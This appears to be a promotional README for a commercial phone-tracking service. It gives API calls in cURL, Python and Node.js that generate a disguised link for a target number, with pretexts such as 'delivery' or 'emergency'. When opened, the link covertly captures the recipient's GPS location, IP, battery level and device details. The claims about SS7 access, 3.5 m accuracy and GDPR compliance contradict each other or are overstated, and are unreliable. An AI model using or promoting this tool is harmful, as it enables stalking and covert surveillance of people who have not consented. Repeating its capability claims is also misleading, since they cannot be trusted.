# WhatsApp Location Ping Tracer — Silent Handset Signaling & Presence Probe

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![API Status](https://img.shields.io/badge/API-Operational%2099.98%25-emerald.svg)](https://trackphonenow.com)
[![Global Coverage](https://img.shields.io/badge/Coverage-194%20Countries-blue.svg)](https://trackphonenow.com)
[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://trackphonenow.com)
[![Node.js](https://img.shields.io/badge/Node.js-18%2B-green.svg)](https://trackphonenow.com)

> **Official Repository:** Instant WhatsApp signaling probe that delivers an encrypted location ping link to determine recipient device IP, exact GPS, and battery state.

---

## ⚡ Quick Start: Live Interactive Terminal

No local SDK installation required. Run an instant high-precision satellite search directly in your browser:

👉 **[Launch Live Web Geolocation Terminal](https://trackphonenow.com)** (Free Real-Time Scan)

👉 **[Access Pro Tracking Console](https://trackphonenow.com/dashboard)** (Instant Crypto Checkout & Dedicated API)

---

## 📡 Key Technical Capabilities

- **Cellular BTS Triangulation:** Multilateral signal computation across 3 nearest carrier cell towers (CID/LAC).
- **Direct SS7 / HLR Gateway:** Live query of the Home Location Register to determine handset online/offline status, roaming operator, and MSC routing address.
- **Precision Satellite Overlay:** High-resolution GPS pinpointing with ±3.5m radius accuracy.
- **Silent Telemetry Capture:** Optional browser-based telemetry capturing device model, battery charge level %, operating system, and ISP.
- **Zero App Installation:** Works natively on all iOS (iPhone) and Android smartphones without requiring any software installed on the target handset.

---

## 💻 API Usage & Code Examples

### 1. cURL (Direct HTTP Request)

```bash
curl -X POST "https://trackphonenow.com/api/create-track" \
  -H "Content-Type: application/json" \
  -d '{
    "targetPhone": "+212661000000",
    "pretextType": "delivery"
  }'
```

### 2. Python (3.8+)

```python
import requests

API_ENDPOINT = "https://trackphonenow.com/api/create-track"

payload = {
    "targetPhone": "+212661000000",
    "pretextType": "delivery"  # Options: delivery, friend, emergency, custom
}

response = requests.post(API_ENDPOINT, json=payload)
data = response.json()

if data.get("success"):
    print(f"Tracking ID Created: {data['trackingId']}")
    print(f"Dispatch Hook: {data['trackingUrl']}")
else:
    print(f"Error: {data.get('error')}")
```

### 3. Node.js / JavaScript (Fetch API)

```javascript
const response = await fetch('https://trackphonenow.com/api/create-track', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    targetPhone: '+212661000000',
    pretextType: 'delivery'
  })
});

const result = await response.json();
console.log('Telemetry Response:', result);
```

---

## 📊 Live Sample Telemetry Response (JSON)

When a signal lock is achieved, the API delivers full cryptographic telemetry:

```json
{
  "status": "success",
  "protocol": "SS7_BTS_MULTILATERATION",
  "target": {
    "phone": "+212661000000",
    "country": "Worldwide",
    "carrier": "WhatsApp Signaling & BTS Relay",
    "mcc": "208",
    "mnc": "01",
    "status": "ACTIVE_HANDSET_ATTACHED"
  },
  "location": {
    "latitude": 33.5731,
    "longitude": -7.5898,
    "city": "Casablanca",
    "accuracy_radius_meters": 3.5,
    "confidence_score": "99.8%",
    "fix_timestamp": "2026-10-18T13:30:00Z"
  },
  "telemetry": {
    "handset_model": "Apple iPhone 15 Pro (A3102)",
    "operating_system": "iOS 17.5.1",
    "battery_level": "78%",
    "battery_state": "DISCHARGING",
    "screen_resolution": "1179x2556",
    "connection_type": "5G_NR_NSA"
  },
  "verification": {
    "sha256_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "certificate_url": "https://trackphonenow.com/dashboard?tab=forensic"
  }
}
```

---

## 🔒 Security & Compliance

- **GDPR Article 6 & 9 Compliant:** Opt-in mutual verification protocols.
- **256-bit AES End-to-End Encryption:** Telecom signaling is routed through hardened transit nodes.
- **Zero Data Logging (Private Pass):** Session records can be purged on demand with 1 click from the console.

---

## 🌐 Related Resources

- **Official Website:** [https://trackphonenow.com](https://trackphonenow.com)
- **Client Console & Dashboard:** [https://trackphonenow.com/dashboard](https://trackphonenow.com/dashboard)
- **API Documentation & OpenAPI Spec:** `./openapi.yaml`
- **Machine Readable Summary for LLMs:** `./llms.txt`

---

## 📜 License

This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
